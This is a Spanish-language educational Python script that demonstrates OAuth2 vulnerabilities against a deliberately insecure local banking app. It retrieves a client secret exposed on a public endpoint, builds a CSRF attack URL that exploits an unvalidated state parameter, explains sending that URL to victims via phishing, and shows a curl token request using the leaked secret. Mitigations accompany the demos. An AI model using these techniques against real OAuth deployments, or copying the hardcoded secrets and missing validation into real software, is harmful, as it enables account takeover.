#!/usr/bin/env python3
"""
Script de Demostración de Vulnerabilidades OAuth2
Proyecto Educativo - Solo para práctica ética
"""

import requests
import secrets
from colorama import init, Fore, Style
import time

init(autoreset=True)

BASE_URL = "http://127.0.0.1:5000"

# Credenciales expuestas (vulnerabilidad)
CLIENT_ID = "banco-app-123456"
CLIENT_SECRET = "SECRET_SUPER_SECRETO_EXPUESTO_123"
JWT_SECRET = "jwt_secret_debil"

def print_header(text):
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}{text:^70}")
    print(f"{Fore.CYAN}{'='*70}\n")

def print_success(text):
    print(f"{Fore.GREEN}✓ {text}")

def print_error(text):
    print(f"{Fore.RED}✗ {text}")

def print_warning(text):
    print(f"{Fore.YELLOW}⚠ {text}")

def print_info(text):
    print(f"{Fore.BLUE}ℹ {text}")

def demo_exposed_credentials():
    """Demostración 1: Client Secret Expuesto"""
    print_header("DEMO 1: CLIENT SECRET EXPUESTO")
    
    print_info("Intentando obtener credenciales OAuth desde endpoint público...")
    
    try:
        response = requests.get(f"{BASE_URL}/oauth/info")
        
        if response.status_code == 200:
            print_success("Credenciales OAuth obtenidas exitosamente!")
            print_warning("VULNERABILIDAD: Las credenciales están públicamente accesibles")
            print(f"\n{Fore.MAGENTA}Credenciales obtenidas:")
            print(f"  CLIENT_ID:     {CLIENT_ID}")
            print(f"  CLIENT_SECRET: {CLIENT_SECRET}")
            print(f"  JWT_SECRET:    {JWT_SECRET}")
            print(f"\n{Fore.RED}IMPACTO: Un atacante puede hacer peticiones OAuth en nombre de la app")
        else:
            print_error("No se pudo acceder al endpoint")
            
    except Exception as e:
        print_error(f"Error: {e}")
        print_warning("Asegúrate de que el servidor esté corriendo en http://127.0.0.1:5000")

def demo_csrf_oauth():
    """Demostración 2: CSRF en OAuth (State no validado)"""
    print_header("DEMO 2: CSRF EN OAUTH (STATE NO VALIDADO)")
    
    print_info("Simulando ataque CSRF en flujo OAuth...")
    
    # Generar state malicioso
    malicious_state = secrets.token_urlsafe(16)
    
    print_warning("ESCENARIO DE ATAQUE:")
    print(f"  1. Atacante inicia flujo OAuth con state: {malicious_state}")
    print(f"  2. Atacante NO completa la autorización")
    print(f"  3. Atacante envía URL a la víctima")
    print(f"  4. Víctima completa la autorización")
    print(f"  5. Cuenta de víctima se vincula a sesión del atacante")
    
    # Generar URL de ataque
    redirect_uri = f"{BASE_URL}/oauth/fakegoogle/callback"
    attack_url = f"{BASE_URL}/oauth/fakegoogle/login?redirect_uri={redirect_uri}&state={malicious_state}&client_id={CLIENT_ID}"
    
    print(f"\n{Fore.RED}URL DE ATAQUE GENERADA:")
    print(f"{Fore.YELLOW}{attack_url}")
    
    print(f"\n{Fore.MAGENTA}CÓMO EXPLOTAR:")
    print("  1. El atacante copia esta URL")
    print("  2. Envía la URL a la víctima (phishing, ingeniería social)")
    print("  3. La víctima hace clic y se autentica con SU cuenta FakeGoogle")
    print("  4. La cuenta bancaria de la víctima queda vinculada al atacante")
    
    print(f"\n{Fore.RED}VULNERABILIDAD: El parámetro 'state' NO se valida correctamente")
    print(f"{Fore.GREEN}MITIGACIÓN: Validar state en el callback comparándolo con el almacenado en sesión")

def demo_token_request():
    """Demostración 3: Obtener token usando credenciales expuestas"""
    print_header("DEMO 3: SOLICITUD DE TOKEN CON CREDENCIALES EXPUESTAS")
    
    print_info("Para esta demo necesitas primero completar el flujo OAuth y obtener un código")
    print_warning("Pasos manuales necesarios:")
    print("  1. Ve a: http://127.0.0.1:5000/login")
    print("  2. Haz clic en 'Iniciar sesión con FakeGoogle'")
    print("  3. Login con: usuario@fakegoogle.com / fakegoogle123")
    print("  4. Autoriza la aplicación")
    print("  5. En la URL del callback, copia el parámetro 'code'")
    
    print(f"\n{Fore.YELLOW}Ejemplo de petición curl:")
    
    curl_example = f"""
curl -X POST {BASE_URL}/oauth/fakegoogle/token \\
  -H "Content-Type: application/json" \\
  -d '{{
    "code": "TU_CODIGO_AQUI",
    "client_id": "{CLIENT_ID}",
    "client_secret": "{CLIENT_SECRET}"
  }}'
"""
    
    print(f"{Fore.CYAN}{curl_example}")
    
    print(f"\n{Fore.RED}VULNERABILIDAD: Cualquiera con el CLIENT_SECRET puede obtener tokens")
    print(f"{Fore.GREEN}MITIGACIÓN: NUNCA exponer CLIENT_SECRET, usar variables de entorno")

def demo_vulnerable_flow():
    """Mostrar el flujo completo vulnerable"""
    print_header("FLUJO OAUTH2 COMPLETO (VULNERABLE)")
    
    flow_diagram = f"""
{Fore.CYAN}┌──────────────────────────────────────────────────────────────────┐
│                    FLUJO OAUTH2 VULNERABLE                       │
└──────────────────────────────────────────────────────────────────┘

{Fore.WHITE}1. Usuario hace clic en "Iniciar sesión con FakeGoogle"
   {Fore.YELLOW}↓ redirect_uri + state (NO validado ❌)
   
{Fore.WHITE}2. Usuario redirigido a /oauth/fakegoogle/login
   {Fore.YELLOW}↓ ingresa email + password
   
{Fore.WHITE}3. Usuario autenticado en FakeGoogle
   {Fore.YELLOW}↓ redirect a pantalla de autorización
   
{Fore.WHITE}4. Pantalla de consentimiento (/oauth/fakegoogle/authorize)
   {Fore.RED}VULNERABILIDAD: state NO se valida aquí ❌
   {Fore.YELLOW}↓ usuario acepta permisos
   
{Fore.WHITE}5. Código de autorización generado
   {Fore.YELLOW}↓ redirect a callback con code + state
   
{Fore.WHITE}6. Callback (/oauth/fakegoogle/callback)
   {Fore.RED}VULNERABILIDAD: state NO se valida en callback ❌
   {Fore.YELLOW}↓ intercambia code por token
   
{Fore.WHITE}7. Petición a /oauth/fakegoogle/token
   {Fore.RED}VULNERABILIDAD: CLIENT_SECRET expuesto ❌
   {Fore.YELLOW}↓ devuelve access_token (JWT)
   
{Fore.WHITE}8. Usuario autenticado en el banco
   {Fore.GREEN}✓ Sesión iniciada con cuenta OAuth

{Fore.RED}VULNERABILIDADES CRÍTICAS:
{Fore.YELLOW}  • State parameter no validado → CSRF vulnerable
  • Client Secret expuesto públicamente
  • Códigos de autorización reutilizables
  • Redirect URI no validado estrictamente
"""
    
    print(flow_diagram)

def show_menu():
    """Menú principal"""
    while True:
        print_header("DEMO DE VULNERABILIDADES OAUTH2")
        print(f"{Fore.WHITE}Selecciona una opción:\n")
        print(f"{Fore.CYAN}1. {Fore.WHITE}Demo: Client Secret Expuesto")
        print(f"{Fore.CYAN}2. {Fore.WHITE}Demo: CSRF en OAuth (State no validado)")
        print(f"{Fore.CYAN}3. {Fore.WHITE}Demo: Solicitud de Token con credenciales expuestas")
        print(f"{Fore.CYAN}4. {Fore.WHITE}Ver flujo OAuth2 completo vulnerable")
        print(f"{Fore.CYAN}5. {Fore.WHITE}Ejecutar todas las demos")
        print(f"{Fore.CYAN}6. {Fore.WHITE}Abrir documentación")
        print(f"{Fore.RED}0. {Fore.WHITE}Salir\n")
        
        choice = input(f"{Fore.GREEN}Opción: {Style.RESET_ALL}")
        
        if choice == "1":
            demo_exposed_credentials()
        elif choice == "2":
            demo_csrf_oauth()
        elif choice == "3":
            demo_token_request()
        elif choice == "4":
            demo_vulnerable_flow()
        elif choice == "5":
            demo_exposed_credentials()
            time.sleep(2)
            demo_csrf_oauth()
            time.sleep(2)
            demo_token_request()
            time.sleep(2)
            demo_vulnerable_flow()
        elif choice == "6":
            print_info("Documentación disponible en: OAUTH_VULNERABILITIES.md")
            print_info(f"También puedes visitar: {BASE_URL}/oauth/info")
        elif choice == "0":
            print(f"\n{Fore.CYAN}¡Hasta luego! Recuerda usar estas técnicas solo en entornos de práctica ética.\n")
            break
        else:
            print_error("Opción inválida")
        
        input(f"\n{Fore.YELLOW}Presiona Enter para continuar...")

def main():
    print(f"{Fore.RED}")
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║         DEMO DE VULNERABILIDADES OAUTH2                       ║
    ║         Proyecto Educativo - Solo Práctica Ética             ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"{Fore.YELLOW}⚠  ADVERTENCIA: Este script es solo para fines educativos")
    print(f"{Fore.YELLOW}⚠  Solo usar en entornos de práctica local")
    print(f"{Fore.YELLOW}⚠  NUNCA usar estas técnicas en sistemas reales sin autorización\n")
    
    # Verificar si el servidor está corriendo
    try:
        response = requests.get(BASE_URL, timeout=2)
        print_success("Servidor detectado en http://127.0.0.1:5000")
    except:
        print_error("No se puede conectar al servidor")
        print_warning("Asegúrate de que el servidor esté corriendo:")
        print(f"{Fore.CYAN}  python app_banco.py\n")
        return
    
    show_menu()

if __name__ == "__main__":
    main()
